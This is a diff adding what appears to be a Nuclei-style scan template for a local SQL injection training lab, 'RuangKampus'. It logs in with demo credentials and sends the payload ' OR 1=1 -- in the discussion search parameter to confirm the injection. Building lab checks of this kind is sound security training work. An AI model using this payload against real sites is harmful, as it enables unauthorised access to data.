@@ -1,0 +1,38 @@
+id: ruangkampus-sqli-discussion-search
+
+info:
+  name: RuangKampus Discussion Search SQL Injection Lab
+  author: codex
+  severity: medium
+  description: |
+    Logs into the synthetic local lab and checks whether SQL syntax in the
+    discussion search parameter changes the query result. This template is
+    intended only for the RuangKampus localhost training application.
+  tags: training,ruangkampus,sqli
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+    headers:
+      Content-Type: application/json
+    body: '{"email":"tegosaputra@demo.test","password":"mahasiswa123"}'
+    cookie-reuse: true
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/discussions?search=%27%20OR%201%3D1%20--%20"
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Selamat datang di ruang diskusi RuangKampus."
